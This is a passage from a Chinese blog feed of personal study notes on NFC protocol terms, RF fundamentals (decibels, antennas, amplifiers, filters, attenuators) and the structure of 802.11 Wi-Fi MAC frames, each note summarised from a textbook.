<li><p>LLCP（逻辑链路控制协议）</p>
<blockquote>
<p>该协议同于管理ISO18092的NDC设备之间逻辑连接的标准，主要用于P2P模式。</p>
</blockquote>
</li>
<li><p>NFC Forum Protocol Bindings</p>
<blockquote>
<p>P2P模式下，高层数据传递采用的是集成传统的IP、OBEX（对象交换）等来实现设备间数据的传递。</p>
</blockquote>
</li>
<li><p>Tag Type</p>
<blockquote>
<p>标签类型，在读写模式下NFC设备能够读取的标签的类型。其中，该标签的类型必须支持ISO18092、IDS1433A/B、MIFARE等标准。</p>
</blockquote>
</li>
<li><p>NDEF（NFC数据交换格式）</p>
<blockquote>
<p>这是NFC一个标准的数据传递协议。</p>
</blockquote>
</li>
<li><p>RTD（记录类型定义）</p>
<blockquote>
<p>NFC NDEF数据格式中定义的数据类型。</p>
</blockquote>
</li>
<li><p>Card Emulation（卡模拟）</p>
<blockquote>
<p>NFC设备模拟成卡片的标准。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《Android NFC开发实战讲解》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>NFC协议</tag>
      </tags>
  </entry>
  <entry>
    <title>RF协议笔记(0X01)</title>
    <url>/RF%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="基本电子术语"><a href="#基本电子术语" class="headerlink" title="基本电子术语"></a>基本电子术语</h3><p>瓦特（W）：功率测量单位</p>
<p>交流电压（AC），比如插座</p>
<p>直流电压（DC），比如电池</p>
<h2 id="射频基础"><a href="#射频基础" class="headerlink" title="射频基础"></a>射频基础</h2><h3 id="发射机和接收机"><a href="#发射机和接收机" class="headerlink" title="发射机和接收机"></a>发射机和接收机</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/19/sDelIYyH4KU9xj6.png"></p>
<p>电信号随电流在导体中移动，进入“T”盒子。T就是发射机，发射机将电子电流转换成空气中的波。</p>
<p>波以光速传播，再达到标注为R的盒子。盒子R就是接收机，将波转换成电子电流。</p>
<h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><h4 id="模拟信号"><a href="#模拟信号" class="headerlink" title="模拟信号"></a>模拟信号</h4><p>如果是能量强度（电流或波）随时间而变化就可以存储信息。当点能量以受控方式随时间变化时就称为信号。信号分为两类：</p>
<ul>
<li>模拟信号</li>
<li>数字信号</li>
</ul>
<p>在射频世界里，信号强度通常都是以功率（W）来衡量。</p>
<p>信号在1秒内完成一个完整正弦波的次数就是信号的频率（Hz）。</p>
<h4 id="频率"><a href="#频率" class="headerlink" title="频率"></a>频率</h4><p>根据频率可以将一个射频信号和另一个射频信号隔离，也可以区分不同的无线应用。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/19/JpXEUdVoTbknW4q.png"></p>
<h4 id="数字信号"><a href="#数字信号" class="headerlink" title="数字信号"></a>数字信号</h4><p>数字信号是用来<strong>表示信息</strong>的，不用来承载空气中传播的信息。</p>
<p>只有模拟信号（正弦波）可以承载信息。</p>
<h1 id="射频行为"><a href="#射频行为" class="headerlink" title="射频行为"></a>射频行为</h1><p>影响射频能量的两个基本概念是<strong>损耗</strong>和<strong>增益</strong>。</p>
<h2 id="损耗和增益"><a href="#损耗和增益" class="headerlink" title="损耗和增益"></a>损耗和增益</h2><h3 id="器件"><a href="#器件" class="headerlink" title="器件"></a>器件</h3><p>所有元器件都可以归为有源和无源的两类。</p>
<p>需要供电才能正常工作的叫有源器件，反之叫无源器件。</p>
<p>所有器件都或显示损耗特性，或显示增益特性。如果出来的信号大于进去的信号，表明该器件有增益，这样的器件叫做放大器。</p>
<p>所有放大器都是有源器件。</p>
<p>如果出来的信号小于进去的信号，表明该器件有损耗。出来的信号较小，没出来的信号转变为了热能。</p>
<h2 id="分贝"><a href="#分贝" class="headerlink" title="分贝"></a>分贝</h2><h3 id="分贝数学表达式"><a href="#分贝数学表达式" class="headerlink" title="分贝数学表达式"></a>分贝数学表达式</h3><p>+3dB指的是两倍大（乘以2）</p>
<p>+10dB指的是10倍大（乘以10）</p>
<p>-3dB指的是减小到1/2（除以2）</p>
<p>+10dB同理</p>
<p>例：</p>
<blockquote>
<p>如果信号经历的增益为4000（变大4000倍）那么增益为多少dB？</p>
<p>化为最小因数：</p>
<p>4000 = 10 * 10 * 10 * 2 * 2 = 10dB + 10dB +10dB +3dB +3dB = 36dB</p>
</blockquote>
<h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>带宽是描述频率范围的方法，它等于器件或应用中最高频率和最低频率的差值，所以需要两个频率值来定义带宽。</p>
<p>例：计算百分比带宽</p>
<blockquote>
<p>如果设备能容纳从75MHz到125MHz之间的所有频率，它的百分比带宽是多少？</p>
<p>计算：平均值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100MHz（（125MHz+75MHz）&#x2F; 2）</span><br></pre></td></tr></table></figure>

<p>再用实际带宽除以平均值，再乘100%</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50MHz &#x2F; 100MHz * 100% &#x3D; 50%</span><br></pre></td></tr></table></figure>


</blockquote>
<h2 id="宽带和窄带"><a href="#宽带和窄带" class="headerlink" title="宽带和窄带"></a>宽带和窄带</h2><p>所有射频器件都可以归为两类：窄带（窄的带宽）或者宽带（宽的带宽）。</p>
<p>如果设备带宽小于50%就是窄带，大于50%就是宽带。</p>
<h2 id="环境中的射频"><a href="#环境中的射频" class="headerlink" title="环境中的射频"></a>环境中的射频</h2><h3 id="信号行为"><a href="#信号行为" class="headerlink" title="信号行为"></a>信号行为</h3><ul>
<li>趋肤效应：射频信号只存在于物体的表面上，如果在物体内部放一个检测器，将检测不到射频信号的存在。</li>
<li>自由空间损耗：水壶洒水效应，方框离撒头越远，收集到的就越少。</li>
<li>吸收：传输过程中会被空气、雨、玻璃等吸收，转化为热量，微波炉就是这个原理。</li>
<li>反射：字面意思，反射值与两个因素有关，射频频率和物体的材料。</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习途径是《射频和无线技术入门（第二版）》</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>RF协议</tag>
      </tags>
  </entry>
  <entry>
    <title>RF协议笔记(0X02)</title>
    <url>/RF%E5%8D%8F%E8%AE%AE02/</url>
    <content><![CDATA[<h1 id="基本系统器件"><a href="#基本系统器件" class="headerlink" title="基本系统器件"></a>基本系统器件</h1><h2 id="天线"><a href="#天线" class="headerlink" title="天线"></a>天线</h2><h3 id="方框图"><a href="#方框图" class="headerlink" title="方框图"></a>方框图</h3><p>每个无线系统都有天线。天线的任务就是把电信号转化成无线波，或者把无线波转化成电信号。</p>
<h3 id="天线特性"><a href="#天线特性" class="headerlink" title="天线特性"></a>天线特性</h3><p>天线可以使有源也可以是无源器件，有源天线仅仅比无源天线内部多了放大器。</p>
<p>任一种天线的形状和大小都依赖于三个因素：</p>
<ul>
<li>天线的物理特性依赖的是<strong>频率</strong>。</li>
<li>无线电波传播的方向</li>
<li>天线发送或者接受的功率。功率越大，无线规模越大。</li>
</ul>
<h3 id="天线增益"><a href="#天线增益" class="headerlink" title="天线增益"></a>天线增益</h3><p>所有天线都有增益，无源也有（方向增益）。</p>
<p>定向天线相对于各向同性天线被认为是具有增益，这是方向增益，不是功率增益。天线束月集中，它的增益越大。</p>
<h3 id="极化"><a href="#极化" class="headerlink" title="极化"></a>极化</h3><p>当射频波在空气中传播，正弦波自身有方向：垂直或水平。这个方向称作极化。</p>
<h3 id="一维、二维、智能天线"><a href="#一维、二维、智能天线" class="headerlink" title="一维、二维、智能天线"></a>一维、二维、智能天线</h3><p>一维天线由许多电线组成，单极和双极是两种最基本的一维天线。一个单极天线仅仅是一个直的天线，它的长度近似于要辐射信号波长的四分之一。双极信号长度近似于射频信号波长的一半。</p>
<p>二维天线由片状、阵列状、喇叭状、碟状。一个片状天线就是一块正方形的金属。</p>
<p>智能天线：在大多数蜂窝系统中，蜂窝被分成3个120度的扇区，每套天线负责120度的覆盖，因此当看一个天线方向图时，存在120度的波束宽度。</p>
<h2 id="放大器"><a href="#放大器" class="headerlink" title="放大器"></a>放大器</h2><h3 id="放大器的基本属性"><a href="#放大器的基本属性" class="headerlink" title="放大器的基本属性"></a>放大器的基本属性</h3><p>放大器有三个基本属性：增益、噪声系数或输出功率、线性。</p>
<p>放大器主要分为三类：低噪声、高功率、其他。</p>
<ol>
<li><p>增益</p>
<blockquote>
<p>增益是度量出书信号比输入信号大多少</p>
</blockquote>
</li>
<li><p>噪声系数</p>
<blockquote>
<p>低噪声放大器（LNA）用于监听非常小的射频信号。LNA的安静度量叫做噪声系数（NF），用dB做度量单位。</p>
<p>LNA的NF越低越好。</p>
</blockquote>
</li>
<li><p>输出功率</p>
<blockquote>
<p>在射频信号从天线出来之前，高功率放大器（HPA）尽可能放大射频信号。信号越大，输出的越远。</p>
<p>HPA的第二个基本属性是输出功率，用瓦特来度量。一般来说，功率越高越好。</p>
</blockquote>
</li>
<li><p>线性</p>
<blockquote>
<p>数字无线通信的一个含义就是当一个数字信号加载到射频的载波上，信号通过人一个放大器都必须是真正的线性，</p>
<p>线性用来度量放大器使信号失真的程度。</p>
</blockquote>
</li>
</ol>
<h3 id="放大器如何工作"><a href="#放大器如何工作" class="headerlink" title="放大器如何工作"></a>放大器如何工作</h3><p>当输入信号通过放大器时，它本身并没有真正变大。</p>
<h3 id="特殊放大器"><a href="#特殊放大器" class="headerlink" title="特殊放大器"></a>特殊放大器</h3><ul>
<li><p>限制放大器</p>
<blockquote>
<p>作用：限制了输出功率</p>
<p>如果放大器的功率太大，它后边的器件容易损坏，这时候就需要限制放大器</p>
</blockquote>
</li>
<li><p>平衡放大器</p>
<blockquote>
<p>在平衡放大器中，有两个并联的放大器</p>
<p>优点</p>
<ol>
<li>如果一个坏了，另一个仍然可以工作，但性能会降低</li>
<li>平衡放大器比普通放大器提供更好的匹配。</li>
</ol>
</blockquote>
</li>
<li><p>可变增益放大器</p>
<blockquote>
<p>可变增益放大器（VGA）有一个外部控制，允许用户在预定义范围内变化增益</p>
</blockquote>
</li>
</ul>
<h2 id="滤波器"><a href="#滤波器" class="headerlink" title="滤波器"></a>滤波器</h2><h3 id="滤波器的功能"><a href="#滤波器的功能" class="headerlink" title="滤波器的功能"></a>滤波器的功能</h3><p>功能：滤除所有不需要的信号</p>
<h3 id="特殊滤波器"><a href="#特殊滤波器" class="headerlink" title="特殊滤波器"></a>特殊滤波器</h3><ol>
<li><p>双工机</p>
<blockquote>
<p>吧两个滤波器放在一个器件里。常用于基站天线的连接。既可以发射又能接收。</p>
</blockquote>
</li>
<li><p>SAW滤波器</p>
<blockquote>
<p>SAW代表声表面波。随着频率变小，射频器件变大。</p>
<p>SAW滤波器将射频信号转化为声音信号，然后滤出声音信号，最后再把声音信号转化为射频信号。</p>
<p>SAW滤波器真正商业化的只在10MHz到约3GHz之间。</p>
</blockquote>
</li>
<li><p>超导滤波器</p>
<blockquote>
<p>超导是特殊材料，没有阻抗。</p>
<p>超导滤波器应用于蜂窝基站，是目前它们唯一真正的应用，因为它们非常大，而且超导滤波器工作是需要保持温度很低。</p>
</blockquote>
</li>
</ol>
<h2 id="混频器"><a href="#混频器" class="headerlink" title="混频器"></a>混频器</h2><h3 id="混频器的功能"><a href="#混频器的功能" class="headerlink" title="混频器的功能"></a>混频器的功能</h3><ul>
<li><p>数学表达</p>
<blockquote>
<p>混频器的目的就是改变信号的频率但保持信号的其他特性不变。</p>
</blockquote>
</li>
<li><p>改变频率</p>
<blockquote>
<p>信号的频率必须改变，因为日常生活中遇到的信号是在空中传播的不同频率的、携带信息的信号。</p>
</blockquote>
</li>
<li><p>混频器的其他名字</p>
<blockquote>
<p>上变频器或下变频器。</p>
<p>如果混频器是接收机的一部分，那么它就是下变频器。</p>
<p>如果是发射机的一部分，就是上变频器。</p>
</blockquote>
</li>
</ul>
<h2 id="信源"><a href="#信源" class="headerlink" title="信源"></a>信源</h2><p>也称为振荡器，给混频器提供一个输入的振荡器叫做本地振荡器或LO。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><blockquote>
<p>所有振荡器都是有源器件。</p>
</blockquote>
<p>振荡器就是射频最先发出来的地方。他们是射频的源。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/23/YJwoShiBT2kG4qO.png"></p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习途径是《射频和无线技术入门（第二版）》</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>RF协议</tag>
      </tags>
  </entry>
  <entry>
    <title>RF协议笔记(0X03)</title>
    <url>/RF%E5%8D%8F%E8%AE%AE03/</url>
    <content><![CDATA[<h1 id="其他器件"><a href="#其他器件" class="headerlink" title="其他器件"></a>其他器件</h1><h2 id="衰减器"><a href="#衰减器" class="headerlink" title="衰减器"></a>衰减器</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>衰减器就是反向放大器。</p>
<p>有时在无线系统中补丁信号太大，就需要引入衰减器，通过衰减器使信号变小。</p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
<li><p>固定衰减器</p>
<blockquote>
<p>固定衰减器，使信号经受固定量的损耗，以dB来度量。</p>
<p>有时固定衰减器被称为常量衰减器。</p>
<p>一个典型的固定衰减器可能会表现出3dB的插入损耗，因此事3dB衰耗器</p>
</blockquote>
</li>
<li><p>电压可变衰减器</p>
<blockquote>
<p>可变衰减器允许射频工程师在任何时候通过使用外部控制，来控制确切的衰减量。</p>
<p>电压可变衰减器在给定衰减范围内变化衰减，受外部控制电压控制。</p>
</blockquote>
</li>
<li><p>数字衰减器</p>
<blockquote>
<p>数字衰减器有多个输入控制，每个控制不同的衰减值。</p>
<p>便于理解：吧数字衰减器看成是一束固定的衰减器，它们都在一排，可以在任何时候换进电路或者换出电路。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习途径是《射频和无线技术入门（第二版）》</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>RF协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X01)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<h1 id="网络概论"><a href="#网络概论" class="headerlink" title="网络概论"></a>网络概论</h1><h2 id="802-11相关术语及其设计"><a href="#802-11相关术语及其设计" class="headerlink" title="802.11相关术语及其设计"></a>802.11相关术语及其设计</h2><p>802.11网络包含四种主要物理组件。包括：</p>
<ul>
<li><p>工作站</p>
<blockquote>
<p>所谓的工作站，就是配备无线网络接口的计算设备。例如笔记本等设备。</p>
</blockquote>
</li>
<li><p>接入点</p>
<blockquote>
<p>具备无线至有线的桥接功能的设备成为接入点（AP）。接入点的功能不止于此，但桥接最为重要。</p>
</blockquote>
</li>
<li><p>无线媒介</p>
<blockquote>
<p>802.11标准已以无线媒介在工作站之间传递帧</p>
</blockquote>
</li>
<li><p>分布式系统</p>
<blockquote>
<p>分布式系统属于802.11的逻辑组件，负责将传送至目的地。</p>
</blockquote>
</li>
</ul>
<p>802.11允许我们将几个BSS串联为扩展服务集，借此扩展无线网络的覆盖区域。所谓ESS，就是利用骨干网络将几个BSS串联在一起。所有位于同一个ESS的接入点将会使用相同的服务组标识符（SSID），也就是用户所谓的网络“名称”。</p>
<blockquote>
<p>BSS  使用相同身份识别码（ssid）的一个单一访问点(single ap)以及一个无线设备群组，组成一个基本服务组（basic service set，bss）。必须使用相同的ssid。使用不同ssid的设备彼此之间不能进行通信。</p>
<p> ESS  使用相同身份识别码（ssid）的多个访问点(multi ap)以及一个无线设备群组，组成一个扩展服务组（extendedservice set，ess）。</p>
</blockquote>
<p>隶属同一个ESS的工作站可以互相通信。</p>
<h2 id="802-11网络的运作方式"><a href="#802-11网络的运作方式" class="headerlink" title="802.11网络的运作方式"></a>802.11网络的运作方式</h2><h3 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h3><p>802.1一共可以提供9种服务，其中三种用来传递数据、其余6种均做管理操作。目的是让让罗能够追踪移动节点并传递帧。</p>
<h4 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h4><blockquote>
<p>只要基础结构型网络里的移动式工作站传送任何数据就会使用这项服务，一点接入点接收到帧，就会使用分布式服务将帧送至目的地。</p>
<p>任何使用接入点的通信都会通过分布式服务传播，包括关联至同一个接入点的两个移动式工作站的互相通信。</p>
</blockquote>
<h4 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h4><blockquote>
<p>整合服务由分布式系统提供，它让分布式系统得以连接至非IEEE 802.11网络。</p>
</blockquote>
<h4 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h4><blockquote>
<p>之所以能够将帧传递给移动式工作站，是因为移动式工作站会将接入点登记或与接入点产生关联。产生关联后，分布式系统可根据这些登记信息判断哪个移动式工作站该使用哪个接入点。</p>
</blockquote>
<h4 id="重新关联"><a href="#重新关联" class="headerlink" title="重新关联"></a>重新关联</h4><blockquote>
<p>当移动式工作站在服务器与内移动时，它必须随时判断信号的强弱，并在必要时切换关联的接入点。</p>
</blockquote>
<h4 id="取消关联"><a href="#取消关联" class="headerlink" title="取消关联"></a>取消关联</h4><blockquote>
<p>当工作站启动取消关联服务时，存储于分布式系统的关联数据随即会被移除。一旦取消关联，工作站即不在附接在网络上。</p>
</blockquote>
<h4 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h4><blockquote>
<p>关联之前，工作站会以本身的MAC地址来跟接入点进行身份验证。</p>
</blockquote>
<h2 id="移动性的支持"><a href="#移动性的支持" class="headerlink" title="移动性的支持"></a>移动性的支持</h2><p>802.11所提供的的移动性存在于链路层的基本服务区域之间。</p>
<p>就802.11而言，接入点之间可能存在三种转换：</p>
<ul>
<li><p>不转换</p>
<blockquote>
<p>如果工作站未离开当前接入点的服务范围，就无需转换。</p>
</blockquote>
</li>
<li><p>BSS转换</p>
<blockquote>
<p>同ESS内切换BSS访问点。</p>
</blockquote>
</li>
<li><p>ESS转换</p>
<blockquote>
<p>从某个ESS移动至另一个ESS。802.11并未支持此类切换，不过允许工作站在离开第一个ESS范文智能的接入点之后与第二个ESS范围内的接入点关联。</p>
</blockquote>
</li>
</ul>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X02)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE02/</url>
    <content><![CDATA[<h1 id="802-11MAC基础"><a href="#802-11MAC基础" class="headerlink" title="802.11MAC基础"></a>802.11MAC基础</h1><h2 id="MAC所面临的挑战"><a href="#MAC所面临的挑战" class="headerlink" title="MAC所面临的挑战"></a>MAC所面临的挑战</h2><h3 id="射频链路品质"><a href="#射频链路品质" class="headerlink" title="射频链路品质"></a>射频链路品质</h3><p>和其他链路层协议不同，802.11采用<strong>肯定确认</strong>机制，即所有传送出去的帧都必须得到响应，只要有任何一个环节失败，该帧即被视为已经遗失。</p>
<h3 id="隐藏节点的问题"><a href="#隐藏节点的问题" class="headerlink" title="隐藏节点的问题"></a>隐藏节点的问题</h3><p>物理的媒介线路中包含的信号，而且会传输至网络各个节点。无线网络的界限比较模糊，有时候并不是每个节点都跟其他节点直接通信。</p>
<h3 id="MAC访问模式与时机"><a href="#MAC访问模式与时机" class="headerlink" title="MAC访问模式与时机"></a>MAC访问模式与时机</h3><blockquote>
<p>无线介质资源的访问控制方式分为DCF和PCF两种：DCF是基于竞争机制，多个分布式无线节点抢同一资源；</p>
<p>PCF使用无竞争模式所有的带宽分配都由一个全局的Point控制。</p>
<p>HCF（混合协调功能）允许服务站维护多组服务队列，针对需要更高服务质量的应用提供更多的无线媒介访问机会。</p>
<p> 目前绝大多数无线设备使用DCF模式。</p>
</blockquote>
<h3 id="载监听功能和网络矢量分配"><a href="#载监听功能和网络矢量分配" class="headerlink" title="载监听功能和网络矢量分配"></a>载监听功能和网络矢量分配</h3><p>载波监听主要用来判断媒介是否处于可用状态，802.11具备两种载波监听功能：</p>
<ul>
<li><p>物理载波监听</p>
<blockquote>
<p>物理载波监听功能由物理层所提供，取决于所使用的媒介与调试方式。</p>
</blockquote>
</li>
<li><p>虚拟载波监听</p>
<blockquote>
<p>虚拟载波监听是由网络分配矢量所提供，802.11的帧通常会分配一个Duration的字段，用来预定一段媒介的使用时间。</p>
</blockquote>
</li>
</ul>
<h2 id="利用DCF进行基于竞争的访问"><a href="#利用DCF进行基于竞争的访问" class="headerlink" title="利用DCF进行基于竞争的访问"></a>利用DCF进行基于竞争的访问</h2><p>大部分的传输操作均会采用DCF(分布式协调功能)。DCF允许多个独立的工作站互相交互，无需通过中心控制节点。因此可以用户IBSS网络或基础结构网络。</p>
<p>试图传输数据之前，工作站必须查看媒介是否处于闲置状态，若处于忙碌状态，工作站必须延迟访问并使用DCF的传输中将会运用到的两项基本规则。</p>
<blockquote>
<p>DIFS全称(Distributed Inter-frame Spacing,DIFS)分布式帧间间隙</p>
</blockquote>
<ul>
<li>如果媒介限制时间长于DIFS，便可立即进行传输。</li>
<li>如果媒介处于忙碌状态，则工作站必须等候至信道再度闲置，802.11称之为访问延迟。</li>
</ul>
<h2 id="帧的分段与重组"><a href="#帧的分段与重组" class="headerlink" title="帧的分段与重组"></a>帧的分段与重组</h2><p>来自叫上层的封包以及某些较大型的管理帧可能必须经过分段，无线信道才有办法加以传送。</p>
<p>当干扰存在时，分段封包也有主页提升可靠性。利用帧的分段，无线局域网工作站可以干扰只影响娇小的帧片段，而非较大的帧。</p>
<h2 id="帧格式"><a href="#帧格式" class="headerlink" title="帧格式"></a>帧格式</h2><p>为迎接无线数据链路所带来的挑战，MAC被迫采用了许多特殊的功能，其中包括使用四个地址字段。这些地址字段值也会因为MAC帧类型的不同而有所差异。</p>
<p>字段顺序由左至右，<strong>最高有效位</strong>将会<strong>最后出现</strong></p>
<h2 id="Frame-Control字段"><a href="#Frame-Control字段" class="headerlink" title="Frame Control字段"></a>Frame Control字段</h2><p>所有帧的开头均是长为两个字节的Frame Control（帧控制）字段，该字段包括以下字段：</p>
<ul>
<li><p>Protocol字段</p>
<blockquote>
<p>Protocol（协议版本）字段由两位构成，用以显示该帧所使用的MAC版本。</p>
</blockquote>
</li>
<li><p>Type与Subtype字段</p>
<blockquote>
<p>Type（类型）与Subtype（子类型）字段用来指定使用的帧类型。</p>
</blockquote>
</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/06/GxOslSeC3hqcr4M.png"></p>
<ul>
<li><p>To DS与From DS</p>
<blockquote>
<p>这两个帧用来指示目的地是否为分布式系统。</p>
</blockquote>
</li>
<li><p>More fragments位</p>
<blockquote>
<p>较上层的封包经过MAC分段处理，除了最后一个片段，其他片段均会将此位设定为1。</p>
<p>大型的数据帧以及某些管理帧可能需要加一分段，除此之外的其他帧会将此位设定为0。</p>
</blockquote>
</li>
<li><p>Retry位</p>
<blockquote>
<p>有事后可能需要重传帧。任何重传的帧会将此位设定为1，以协助接收端剔除重复的帧。</p>
</blockquote>
</li>
<li><p>Power management位</p>
<blockquote>
<p>‘此位用来指出发送端在完成当前的原子帧交换之后是否进入省电模式。</p>
<p><code>1</code>代表工作站即将进入省电模式，而<code>0</code>则代表工作站会一直保持在清醒状态。</p>
</blockquote>
</li>
<li><p>More data位</p>
<blockquote>
<p>为了服务处于省电模式中的工作站，接入点会将这些从分布式系统接收来的帧加以缓存。接入点如果设定此位，即代表至少有一个帧待传给休眠中的工作站。</p>
</blockquote>
</li>
<li><p>Protected Frame位</p>
<blockquote>
<p>相对于固定式网络，无线传送本质上就比较容易被拦截。如果帧收到链路层安全协议的保护，则此位会被设定为<code>1</code>。</p>
</blockquote>
</li>
<li><p>Order位</p>
<blockquote>
<p>帧与帧片段可依次传送，不过发送端与接收端的MAC必须付出额外的代价。一旦进行严格依次传送，则此位会被设定为<code>1</code>。</p>
</blockquote>
</li>
</ul>
<h2 id="Duration-ID字段"><a href="#Duration-ID字段" class="headerlink" title="Duration/ID字段"></a>Duration/ID字段</h2><p>Duration/ID字段紧跟在Frame Control字段之后。有三种可能的形式，先看图再接着往下看：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/11/05/5bjtDrJgPnZToqS.png"></p>
<ul>
<li><p>Duration：设定NAV</p>
<blockquote>
<p>当第15个位被设定为<code>0</code>时，Duration/ID字段就会被用来设定NAV。此数值代表当前所进行的传送预计使用媒介多少微妙。工作站必须监视所收到的任何帧头并据此更新NAV。</p>
</blockquote>
</li>
<li><p>无竞争周期所传送的帧</p>
<blockquote>
<p>在无精症周期（CFP），第14位为<code>0</code>，而第15位为<code>1</code>，其他所有为均为<code>0</code>，因此Duration/ID字段的值为32768.这个数值被解读为NAV。</p>
</blockquote>
</li>
<li><p>PS-Poll帧</p>
<blockquote>
<p>在PS-Pool（省电-轮询）帧中，第14位与第15位会被同事设定为<code>1</code>。移动式工作站可以关闭天线以达到省电目的。</p>
<p>休眠的工作站必须顶起醒来。为确保不遗漏任何帧，从休眠状态醒来的工作站必须送出一个PS-Pool帧，以便从接入点取得之前缓存的任何帧。</p>
</blockquote>
</li>
</ul>
<h2 id="Address字段"><a href="#Address字段" class="headerlink" title="Address字段"></a>Address字段</h2><p>一个802.11帧最多可以包含4个地址（Address）字段。基本上，Address1表示接收端，Address2代表发送端，Address3字段被接收端拿来过滤地址。</p>
<p>802.11所使用的寻址模式易迅其他的IEEE 802网络锁使用的格式。</p>
<blockquote>
<p>地址本身的长度有48位，如果传送给实际媒介的第一个位为<code>0</code>，则改地址代表单一工作站。如果第一位为<code>1</code>，则该地址代表一组实体工作站，称为组播（multicast）。如果所有位均为<code>1</code>，该帧属于广播。</p>
</blockquote>
<h2 id="顺序控制（Sequence-Control）字段"><a href="#顺序控制（Sequence-Control）字段" class="headerlink" title="顺序控制（Sequence Control）字段"></a>顺序控制（Sequence Control）字段</h2><p>此字段的长度为16位，用来重组帧片段以及丢弃重复帧。它是由4位的片段编号字段以及12位的顺序标号组成</p>
<h2 id="帧主体"><a href="#帧主体" class="headerlink" title="帧主体"></a>帧主体</h2><p>帧主体也成为了数据字段，负责在工作站之间传递上层有效荷载（payload）。在最初指定的规范中，802.11帧最多可以传送2304个字节的有效荷载。</p>
<h2 id="帧校验序列（FCS）"><a href="#帧校验序列（FCS）" class="headerlink" title="帧校验序列（FCS）"></a>帧校验序列（FCS）</h2><p>当帧送至无线接口时会先计算FCS，然后再经RF或IR链路传送出去。</p>
<p>接收端随后会为收到的帧计算FCS，然后与记录在帧中的FCS进行比较。如果两者相符，则该帧极有可能在传送过程中未受损，如果帧的FCS游湖则随即予以丢弃，否则就交给上层协议处理。</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《WiFi802.11无线网络权威指南（第二版）》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>Wi-Fi协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Wi-Fi协议笔记(0X03)</title>
    <url>/Wi-Fi%E5%8D%8F%E8%AE%AE03/</url>
    <content><![CDATA[<h1 id="802-11MAC基础"><a href="#802-11MAC基础" class="headerlink" title="802.11MAC基础"></a>802.11MAC基础</h1><h2 id="802-11对上层协议的封装"><a href="#802-11对上层协议的封装" class="headerlink" title="802.11对上层协议的封装"></a>802.11对上层协议的封装</h2><p>802.11是以802.2的逻辑链路控制（LCC）封装来携带上层协议。</p>
<p>传送时，用来封装LLC数据的方式有两种，一种是RFC 1024所描述的方式，另外一种则是802.1H所规范的方式。</p>
<h2 id="广播与组播数据或管理帧"><a href="#广播与组播数据或管理帧" class="headerlink" title="广播与组播数据或管理帧"></a>广播与组播数据或管理帧</h2><p>广播与组播帧的交换过程最为简单，因为这些帧无需响应。这两种帧也可以视为组帧，因为其接受对象不限于单一工作站。成帧与寻址在802.11中较为复杂，使用此规则的帧的类型如下：</p>
<ul>
<li><strong>广播数据帧</strong>会在Address1字段中填入广播地址</li>
<li><strong>组播数据帧</strong>会在Address1字段中填入组播地址</li>
<li><strong>广播管理帧</strong>会在Address1字段中填入广播地址</li>
</ul>
<h2 id="单播帧"><a href="#单播帧" class="headerlink" title="单播帧"></a>单播帧</h2><p>在802.11标准中，针对个别工作站所传送的帧成为<strong>直接数据</strong>，也可称之为<strong>单播</strong>。单播帧必须得到确认以保证可靠性，也意味着可借助各种机制来改善传送效率。</p>
<p>两个工作站之间的传送可靠性建立在简单的肯定确认上。单播数据帧必须得到肯定确认，否则该帧会被认定为已经遗失。</p>
<blockquote>
<p>帧分段是由MAC的分段阈值参数控制。</p>
</blockquote>
<h2 id="帧的处理与桥接"><a href="#帧的处理与桥接" class="headerlink" title="帧的处理与桥接"></a>帧的处理与桥接</h2><p>无线接入点的核心就是<strong>桥接器</strong>，负责在无线与有限媒介之间转换帧。</p>
